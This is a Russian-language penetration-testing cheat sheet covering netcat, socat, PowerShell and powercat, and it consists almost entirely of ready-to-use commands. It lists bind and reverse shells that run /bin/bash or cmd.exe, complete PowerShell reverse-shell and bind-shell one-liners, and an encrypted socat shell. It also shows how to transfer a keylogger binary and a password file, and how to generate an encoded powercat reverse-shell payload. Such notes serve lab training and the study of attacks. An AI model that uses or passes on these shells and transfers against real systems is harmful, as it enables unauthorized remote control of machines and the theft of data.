## **02. Прочие утилиты**

### **02.01. Netcat**

```
# проверка портов
nc -nv 192.168.0.178 80

# прослушивание портов
 nc -nlvp 4444

# прием и передача файлов
nc -nlvp 4444 > incoming.exe
nc -nv 192.168.0.178 4444 < /usr/share/windowsresources/binaries/klogger.exe

# Netcat Bind Shell
nc -nlvp 4444 -e cmd.exe
nc -nv 192.168.0.178 4444

# Netcat Reverse Shell
nc -nlvp 4444
nc -nv 192.168.0.178 4444 -e /bin/bash
```

### **02.02. Socat**

```
# проверка портов
socat - TCP4:192.168.0.178:80

# прослушивание портов
sudo socat TCP4-LISTEN:443 STDOUT

# прием и передача файлов
sudo socat TCP4-LISTEN:443,fork file:secretpass.txt
socat TCP4:192.168.0.174:443 file:new_secretpass.txt,create

# Socat Bind Shell
socat TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
socat TCP4:192.168.0.174:443 STDOUT

# Socat Reverse Shell
socat TCP4:192.168.0.170:443 EXEC:'cmd.exe',pipes
socat TCP4-LISTEN:443, STDOUT

# Crypto Socat Bind Shell
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSLLISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat -OPENSSL:192.168.0.174:443,verify=0
```

### **02.03. PowerShell и Powercat**

```
# разрешение выполения скриптов
Set-ExecutionPolicy Unrestricted

# прием и передача файлов
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.174/passwd.txt','C:\Users\ADMIN\Desktop\passwd.txt')"

# PowerShell и Bind Shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('WindowsIP',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0, $sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
nc -nv 192.168.0.178 443

# PowerShell Reverse Shell
sudo nc -lnvp 443
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('LinuxIP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# установка powercat
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
Import-Module .\powercat.ps1
powercat –h

# прием и передача файлов
sudo nc -lnvp 443 > r_powercat.ps1
powercat -c 192.168.0.174 -p 443 -i C:\Users\ADMIN\Desktop\powercat.ps1

# Powercat Bind Shell
powercat -l -p 443 -e cmd.exe
nc 192.168.0.178 443

# Powercat Reverse Shell
sudo nc -lvp 443
powercat -c 192.168.0.174 -p 443 -e cmd.exe

# Payload Powercat
powercat -c 192.168.0.174 -p 443 -e cmd.exe -ge > reverseshell2.ps1
powershell.exe -E <содержание_reverseshell2.ps1>
sudo nc -lnvp 443
```
